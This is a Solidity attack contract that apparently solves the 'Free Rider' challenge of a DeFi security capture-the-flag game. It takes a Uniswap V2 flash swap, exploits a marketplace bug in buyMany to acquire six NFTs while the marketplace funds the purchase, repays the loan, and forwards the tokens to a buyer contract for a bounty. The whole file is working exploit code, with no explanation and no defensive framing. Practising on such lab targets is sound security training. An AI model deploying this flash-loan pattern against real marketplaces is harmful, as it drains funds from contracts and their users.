// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "../free-rider/FreeRiderNFTMarketplace.sol";
import "../free-rider/FreeRiderBuyer.sol";

interface IUniswapV2Pair {
    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;
}

interface IWETH9 {
    function balanceOf(address) external returns (uint256);

    function deposit() external payable;

    function withdraw(uint256 wad) external;

    function transfer(address dst, uint256 wad) external returns (bool);
}

contract FreeRiderAttacker {
    IUniswapV2Pair uniswapPair;
    FreeRiderNFTMarketplace nftMarketplace;
    FreeRiderBuyer buyer;
    IERC721 dvNft;
    address attacker;
    IWETH9 weth;

    address uniswapPairAddress;
    address buyerAddress;

    uint256[] public tokenIds = [0, 1, 2, 3, 4, 5];

    constructor(
        address _buyer,
        address _uniswapPair,
        address _weth,
        address payable _nftMarketplace,
        address _dvNft
    ) {
        uniswapPairAddress = _uniswapPair;
        buyerAddress = _buyer;

        uniswapPair = IUniswapV2Pair(_uniswapPair);
        weth = IWETH9(_weth);
        nftMarketplace = FreeRiderNFTMarketplace(_nftMarketplace);
        dvNft = IERC721(_dvNft);
        buyer = FreeRiderBuyer(_buyer);

        attacker = msg.sender;
    }

    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external {
        weth.withdraw(amount0);
        nftMarketplace.buyMany{value: address(this).balance}(tokenIds);
        weth.deposit{value: (address(this).balance)}();
        weth.transfer(uniswapPairAddress, weth.balanceOf(address(this)));
    }

    function flashLoan(uint256 flashLoanAmt) external {
        bytes memory data = "arbitrary";
        uniswapPair.swap(flashLoanAmt, 0, address(this), data);
        for (uint256 i = 0; i < 6; i++) {
            dvNft.safeTransferFrom(address(this), buyerAddress, i);
        }
    }

    receive() external payable {}

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
